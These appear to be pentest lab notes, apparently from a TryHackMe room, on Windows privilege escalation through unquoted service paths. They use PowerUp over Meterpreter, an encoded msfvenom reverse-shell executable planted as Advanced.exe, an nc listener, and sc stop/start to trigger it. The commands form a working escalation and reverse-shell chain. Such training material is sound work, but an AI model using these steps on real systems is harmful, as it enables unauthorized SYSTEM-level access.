# PowerShell, Metasploit and Privilege Escalation through Misconfiguration
#pentest/tryhackme

## What 
PowerShell is a task automation and configuration management framework from Microsoft, consisting of a command-line shell and associated scripting language. Initially a Windows component only, known as Windows PowerShell, it was made open-source and cross-platform on 18 August 2016 with the introduction of PowerShell Core.[5] The former is built on the .NET Framework, the latter on .NET Core.

In PowerShell, administrative tasks are generally performed by cmdlets (pronounced command-lets), which are specialized .NET classes implementing a particular operation. These work by accessing data in different data stores, like the file system or registry, which are made available to PowerShell via providers. Third-party developers can add cmdlets and providers to PowerShell.[6][7] Cmdlets may be used by scripts and scripts may be packaged into modules. 

## Script to find misconfigurations
Called PowerUp and can be found here: [PowerSploit/PowerUp.ps1 at master · PowerShellMafia/PowerSploit · GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

**How to use it assuming we are using metasploit?**

1. Upload the script to the target
	1. `upload <PowerUp.ps1 script path>`
2. Initialize PowerShell on the target
	1. `meterpreter > load powershell`
	2. `meterpreter > powershell_shell`
3. Run the script
		1. `PS > . .\PowerUp.ps1`
		2. `PS > Invoke-AllChecks`
4. This will enumerate misconfigurations on the target machine and we can exploit them
5. One of the ideas is that we can find for the **CanRestart** option set as  **true**, this allows us to restart a service on the system. It’s also important for the directory to the application to also be write-able. This means we can replace the legitimate application with our malicious one and restart the service, which will run our infected program!
	1. `msfvenom -p windows/shell_reverse_tcp LHOST=<our-machine> LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe` -> In our machine
	2. `cd <path that the service is running>`
	3. `upload Advanced.exe` -> In our metasploit session
		1. This should be uploaded to the proper path that the service being restarted is reading from
	4. `nc -nlvp 4443` -> In our machine
	5. `shell` -> In our metasploit session
	6. `sc stop <service_name>` -> In our metasploit session
	7. `sc start <service_name>` -> In our metasploit session
		1. The service should try to establish a connection with our machine

## Why this works?
If you’ve gotten to this point and are somewhat confused about what Unquoted Service Paths are, that’s ok.  In a nutshell, USP are a misconfiguration in a directory’s path that contains spaces in which the path isn’t encapsulated in double quotations.  If the path to an executable is “quoted,” the path is specifically defined in the machine and not open to interpretation usually.  If the path is not quoted, then you can maliciously insert executables in to the “spaces.”  This  [link ](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae) provides a pretty good overview of what is going on to cause these vulnerabilities.  

From here we need to determine the locations within the service path that can be exploited.  We see that in this case we could try C:\Program Files (x86), and try to inject something named Program.exe, but we likely do not have permission to do so.  However we know that we have permission to modify the service as we have privileges to run it (StartName: LocalSystem).

Now that we know that we have privileges, and that we have a possible path to inject our malicious executable in to, we need to craft it.  We can use msfvenom to do this.  Keep note that the service path we are targeting is Advanced SystemCare, so we will need to name our malicious executable “Advanced.exe” as this is what the system will attempt to run first. 